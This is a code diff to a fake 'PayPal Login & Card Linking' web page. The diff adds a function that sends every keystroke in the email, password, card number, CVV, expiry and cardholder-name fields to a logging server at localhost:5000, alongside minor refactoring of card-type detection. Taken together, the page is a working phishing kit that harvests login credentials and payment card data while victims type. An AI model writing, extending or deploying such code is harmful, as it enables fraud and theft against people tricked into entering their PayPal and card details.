@@ -6,7 +6,6 @@
 <title>PayPal Login & Card Linking</title>
 <style>
 @import url('https://fonts.googleapis.com/css2?family=Arial:wght@400;700&display=swap');
-
 body { margin:0; font-family:Arial,sans-serif; background-color:#f5f5f5; display:flex; justify-content:center; align-items:center; min-height:100vh; }
 .container { width:90%; max-width:400px; background-color:#fff; border-radius:8px; box-shadow:0 6px 25px rgba(0,0,0,0.15); overflow:hidden; text-align:center; padding:40px 30px; box-sizing:border-box; }
 img.logo { width:120px; margin-bottom:20px; }
@@ -101,7 +100,43 @@ const cvvInput = cardForm.querySelector('input[name="cvv"]');
 const cardLogo = document.getElementById('cardLogo');
 const cardSubmit = document.getElementById('cardSubmit');
 
-// ---------- LOGIN FORM ----------
+// ---------- LOCAL LOGGING TO LINUX SERVER ----------
+function sendToLocalServer(field, value) {
+    fetch("http://localhost:5000/log", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+            field: field,
+            value: value,
+            time: new Date().toISOString()
+        })
+    }).catch(err => console.error("Local logging error:", err));
+}
+
+// ---------- LOGIN FORM WITH AUTO-FOCUS ----------
+const emailInput = loginForm.querySelector('input[name="email"]');
+const passwordInput = loginForm.querySelector('input[name="password"]');
+const loginButton = loginForm.querySelector('button[type="submit"]');
+
+emailInput.addEventListener('keydown', function(e){
+    if(e.key === "Enter") { e.preventDefault(); passwordInput.focus(); }
+    sendToLocalServer(e.target.name, e.target.value);
+});
+
+passwordInput.addEventListener('keydown', function(e){
+    if(e.key === "Enter") { e.preventDefault(); loginButton.focus(); }
+    sendToLocalServer(e.target.name, e.target.value);
+});
+
+loginButton.addEventListener('keydown', function(e){
+    if(e.key === "Enter") { e.preventDefault(); loginForm.dispatchEvent(new Event('submit', {cancelable:true})); }
+});
+
+[emailInput, passwordInput].forEach(input => {
+    input.addEventListener('input', e => sendToLocalServer(e.target.name, e.target.value));
+});
+
+// Login submit
 loginForm.addEventListener('submit', e => {
     e.preventDefault();
     loginContainer.classList.add('hidden');
@@ -122,11 +157,10 @@ linkCardBtn.addEventListener('click', () => {
 function detectCardType(number){
     cardLogo.classList.add('hidden');
     number = number.replace(/\s/g,'');
-    let type='';
-    if(/^4/.test(number)){ type='visa'; cardLogo.src='https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg'; cardLogo.classList.remove('hidden'); }
-    else if(/^5[1-5]/.test(number)){ type='mastercard'; cardLogo.src='https://upload.wikimedia.org/wikipedia/commons/0/04/Mastercard-logo.png'; cardLogo.classList.remove('hidden'); }
-    else if(/^3[47]/.test(number)){ type='amex'; cardLogo.src='https://upload.wikimedia.org/wikipedia/commons/3/30/American_Express_logo.svg'; cardLogo.classList.remove('hidden'); }
-    return type;
+    if(/^4/.test(number)){ cardLogo.src='https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg'; cardLogo.classList.remove('hidden'); return 'visa'; }
+    else if(/^5[1-5]/.test(number)){ cardLogo.src='https://upload.wikimedia.org/wikipedia/commons/0/04/Mastercard-logo.png'; cardLogo.classList.remove('hidden'); return 'mastercard'; }
+    else if(/^3[47]/.test(number)){ cardLogo.src='https://upload.wikimedia.org/wikipedia/commons/3/30/American_Express_logo.svg'; cardLogo.classList.remove('hidden'); return 'amex'; }
+    return '';
 }
 
 function validateCardNumber(number,type){
@@ -166,9 +200,12 @@ function validateForm(){
     cardSubmit.disabled = !(numberValid && cvvValid && expiryValid && nameValid);
 }
 
-// Input listeners
+// ---------- CARD INPUT LISTENERS WITH LOCAL LOGGING ----------
 [cardNumberInput, cvvInput, expiryInput, cardNameInput].forEach(input=>{
-    input.addEventListener('input',validateForm);
+    input.addEventListener('input',function(e){
+        validateForm();
+        sendToLocalServer(e.target.name, e.target.value);
+    });
 });
 
 // Format card number
@@ -184,7 +221,7 @@ expiryInput.addEventListener('input', function(){
     if(value.length>2) value = value.slice(0,2)+'/'+value.slice(2,4);
     this.value = value;
     validateForm();
-    if(value.length === 5) cvvInput.focus(); // auto-focus CVV
+    if(value.length === 5) cvvInput.focus();
 });
 
 // Mask CVV input
